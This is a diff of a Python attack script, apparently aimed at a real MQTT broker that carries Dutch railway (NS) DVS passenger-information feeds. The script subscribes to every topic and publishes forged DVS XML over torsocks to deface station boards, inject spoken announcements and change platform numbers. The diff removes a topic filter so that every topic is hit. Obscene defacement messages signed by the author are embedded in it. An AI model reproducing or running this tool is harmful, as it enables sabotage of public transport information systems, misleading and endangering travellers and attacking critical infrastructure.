@@ -1,23 +1,19 @@
 #!/usr/bin/env python3
 """
-NS DVS MQTT DEFACE - WILDCARD # REAL TIME v2.1
-TRUSTEDF57 - Matrix FULL SCREEN + Frasi esatte
-Audio loop + Tabelloni + Binari fisici
-Torsocks rotation + 100% DVS 6.2 compatible + FIXED TOPIC DETECT
+NS DVS MQTT DEFACE - WILDCARD # REAL TIME v2.2
+FORCE ATTACK ALL TOPICS - NO MORE GENERIC
 """
 
 import paho.mqtt.client as mqtt
 import threading
 import time
 import subprocess
-import xml.etree.ElementTree as ET
 import random
 
 HOST = "78.47.35.220"
 PORT = 1883
 WILDCARD_TOPIC = "#"
 
-# 🔤 Frasi ESATTE
 MESSAGES = [
     "TRUSTEDF57 FUCK MARTHA ROOT FUCK SOCIETY MORON",
     "TRUSTEDF57 VI FOTTE LE MADRI -TRUSTEDF57 FUCK YOUR ASS"
@@ -29,39 +25,26 @@ class DVSMatrixHack:
         self.topic_count = 0
         self.attack_count = 0
         self.tor_count = 0
-        # MATRIX CARATTERI - FULL SCREEN
         self.matrix_chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン０１２３４５６７８９█▓▒░"
     
     def tor_rotate(self):
         self.tor_count += 1
-        if self.tor_count % 10 == 0:
-            print(f"🔄 TORSOCKS ROTATION #{self.tor_count//10}")
+        if self.tor_count % 15 == 0:
+            print(f"🔄 TORSOCKS ROTATION #{self.tor_count//15}")
             subprocess.run(["pkill", "-f", "mosquitto_pub"], capture_output=True)
     
     def generate_matrix_screen(self):
-        """FULL SCREEN MATRIX + scritta centrale GRANDE"""
         matrix_lines = []
         center_msg = MESSAGES[0]
-        
         for i in range(10):
             line = ''.join(random.choices(self.matrix_chars, k=40))
             if i == 5:
                 pad_left = (40 - len(center_msg)) // 2
                 line = ' ' * pad_left + center_msg + ' ' * (40 - len(center_msg) - pad_left)
             matrix_lines.append(line)
-        
         return '\n'.join(matrix_lines)
     
-    def extract_topic_type(self, payload, topic):
-        """FIXED: Detect DVS topic da pattern NS reale"""
-        topic_lower = topic.lower()
-        # Pattern DVS/NS reali
-        if any(x in topic_lower for x in ['dvs', 'trein', 'reisinfo', 'vertrek', 'spoor', 'rit', 'boodschap']):
-            return {'type': 'DVS_TARGET', 'full_topic': topic}
-        return {'type': 'GENERIC', 'full_topic': topic}
-    
     def audio_payload(self):
-        """Audio TTS - frase esatta"""
         msg = random.choice(MESSAGES)
         return f'''<?xml version="1.0" encoding="UTF-8"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
@@ -79,10 +62,8 @@ class DVSMatrixHack:
 </ns1:PutReisInformatieBoodschapIn>'''
     
     def matrix_visual_payload(self):
-        """MATRIX FULL SCREEN + scritta centrale"""
         matrix_text = self.generate_matrix_screen().replace('\n', ' | ')
         msg2 = MESSAGES[1]
-        
         return f'''<?xml version="1.0" encoding="UTF-8"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
 <ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
@@ -103,7 +84,6 @@ class DVSMatrixHack:
 </ns1:PutReisInformatieBoodschapIn>'''
     
     def publish_attack(self, topic, payload, attack_type):
-        """Publish torsocks"""
         self.tor_rotate()
         cmd = [
             "torsocks", "mosquitto_pub",
@@ -111,50 +91,41 @@ class DVSMatrixHack:
             "-t", topic, "-m", payload
         ]
         try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=6)
             if result.returncode == 0:
                 self.attack_count += 1
-                print(f"✅ #{self.attack_count} {attack_type} [{topic[-30:]}] SUCCESSO")
+                print(f"✅ #{self.attack_count} {attack_type} → {topic[-25:]}")
                 return True
         except:
             pass
         return False
     
-    def full_attack(self, topic_info):
-        """Attack completo: Audio + Matrix + Binari"""
-        topic = topic_info['full_topic']
-        
-        # 1. AUDIO TTS
+    def full_attack(self, topic):
+        # AUDIO
         self.publish_attack(topic, self.audio_payload(), "AUDIO")
-        time.sleep(0.5)
-        
-        # 2. MATRIX VISUAL FULL SCREEN
+        time.sleep(0.3)
+        # MATRIX
         self.publish_attack(topic, self.matrix_visual_payload(), "MATRIX")
-        time.sleep(0.5)
-        
-        # 3. BINARI 999 (caos fisico)
+        time.sleep(0.3)
+        # BINARI 999
         bin_payload = self.matrix_visual_payload().replace("666", "999")
-        self.publish_attack(topic, bin_payload(), "BINARI")
+        self.publish_attack(topic, bin_payload, "BINARI 999")
     
     def on_message(self, client, userdata, msg):
-        """WILDCARD # - Real time autodetect FIXED"""
+        """FORCE ATTACK SU OGNI TOPIC - NO FILTER"""
         topic = msg.topic
         if topic in self.discovered_topics:
             return
             
-        payload_str = msg.payload.decode('utf-8', errors='ignore')
-        topic_info = self.extract_topic_type(payload_str, topic)
         self.discovered_topics[topic] = True
         self.topic_count += 1
         
-        print(f"🎯 #{self.topic_count} LIVE: {topic_info['type']} → {topic[-50:]}")
+        print(f"🎯 #{self.topic_count} LIVE ATTACK → {topic[-60:]}")
         
-        # Attack immediato su DVS_TARGET
-        if topic_info['type'] == 'DVS_TARGET':
-            threading.Thread(target=self.full_attack, args=(topic_info,), daemon=True).start()
+        # ATTACCO SU TUTTI I TOPIC
+        threading.Thread(target=self.full_attack, args=(topic,), daemon=True).start()
     
     def start(self):
-        """Main loop"""
         client = mqtt.Client()
         client.on_message = self.on_message
         client.connect(HOST, PORT, 60)
@@ -162,12 +133,11 @@ class DVSMatrixHack:
         
         print("""
 ╔══════════════════════════════════════════════════════╗
-║    NS DVS 6.2 MATRIX FULL SCREEN HACK v2.1 FIXED     ║
-║           TRUSTEDF57 - WILDCARD # LIVE               ║
-║     400+ Tabelloni + Audio + Binari 666/999          ║
+║       NS DVS v2.2 FORCE ATTACK ALL TOPICS            ║
+║           TRUSTEDF57 - NO MORE GENERIC               ║
+║    MATRIX + AUDIO + BINARI su OGNI topic live        ║
 ╚══════════════════════════════════════════════════════╝
         """)
-        print("🔥 ATTACCO SU OGNI DVS_TARGET → MATRIX + AUDIO + BINARI")
         
         client.loop_forever()
 
